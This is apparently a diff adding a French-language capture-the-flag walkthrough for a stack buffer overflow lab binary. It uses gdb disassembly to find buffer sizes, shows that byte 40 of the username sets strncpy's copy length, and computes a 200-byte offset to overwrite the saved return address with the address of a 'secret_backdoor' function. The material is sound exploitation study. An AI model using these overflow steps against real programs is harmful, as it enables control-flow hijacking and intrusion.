@@ -1,0 +1,40 @@
+pour commencer nous allons trouver l'adresse et la longueur du username et du message
+
+username:
+0x0000000000000a30 <+99>:    mov    $0x80,%esi			<- longueur de 128
+0x0000000000000a35 <+104>:   mov    %rax,%rdi			<- 0x7fffffffe460
+0x0000000000000a38 <+107>:   callq  0x770 <fgets@plt>
+
+l'adresse de username est ensuite changé mais on peut la retrouver lors du printf
+0x0000555555554a96 <+201>:   mov    %rdx,%rsi			<- 0x7fffffffe58c
+0x0000555555554a99 <+204>:   mov    %rax,%rdi
+0x0000555555554a9c <+207>:   mov    $0x0,%eax
+0x0000555555554aa1 <+212>:   callq  0x555555554750 <printf@plt> <- break ici
+
+message:
+0x0000555555554995 <+99>:    mov    $0x400,%esi			<- longueur de 1024
+0x000055555555499a <+104>:   mov    %rax,%rdi			<- 0x7fffffffe0f0
+0x000055555555499d <+107>:   callq  0x555555554770 <fgets@plt>
+
+en observant de plus prêt on se rends compte que le strncpy dans set_msg prends la longueur depuis 0xb4(%rax)
+x/1x 0xb4 + $rax
+0x7fffffffe5b4: 0x8c
+
+0x7fffffffe5b4 - 0x7fffffffe58c =
+140737488348596 - 140737488348556 = 40
+grâce à ça on peut contrôle la taille de la copie avec l'offset 40 de username
+
+0x00005555555549c0 <+142>:   mov    %rcx,%rsi		<- notre message
+0x00005555555549c3 <+145>:   mov    %rax,%rdi		<- l'adresse où il sera copié = 0x7fffffffe500
+0x00005555555549c6 <+148>:   callq  0x555555554720 <strncpy@plt>
+
+l'rip de handle_msg est ici
+Saved registers:
+  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
+
+0x7fffffffe5c8 - 0x7fffffffe500 =
+140737488348616 - 140737488348416 = 200
+en modifiant le parametre de strncpy et en mettant l'adresse de secret_backdoor à l'offset 200 de notre message nous pouvons y accéder !
+
+(gdb) x secret_backdoor
+0x55555555488c <secret_backdoor>:       0xe5894855
